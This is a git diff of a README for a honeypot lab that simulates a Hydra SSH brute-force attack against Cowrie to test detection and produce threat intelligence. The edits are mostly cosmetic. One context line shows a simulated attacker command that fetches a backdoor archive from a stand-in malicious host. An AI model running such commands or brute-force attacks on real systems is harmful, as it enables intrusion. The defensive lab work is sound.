@@ -1,9 +1,12 @@
 # Cyber-Deception-Threat-Intelligence-Lab
 Cowrie Honeypot Attack Stimulation
 
+<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/9b558bab-9287-42aa-a65f-c3b243a0efbe" />
+
+
 ---
 
-# 1 Use Case: Hydra Brute Force Attack Detection
+# Use Case 1: Hydra Brute Force Attack Detection
 
 ## Objective
 
@@ -11,7 +14,7 @@ Validate the Cowrie SSH honeypot's ability to detect, capture, and log automated
 
 ---
 
-## Background
+## Objective
 
 Brute force attacks remain one of the most common techniques used by adversaries to gain unauthorized access to internet-facing services. Rather than manually attempting credentials, attackers frequently leverage automated tools such as Hydra to rapidly test large numbers of usernames and passwords against SSH services.To simulate this behavior, a custom password wordlist was created on the Kali Linux attacker machine and used to launch an automated credential attack against the Cowrie SSH honeypot.
 
@@ -285,8 +288,6 @@ curl https://malicious.example/backdoor.tar.gz
 ✅ Threat intelligence generated
 
 ✅ Adversary behavior documented
-
----
 
 
 
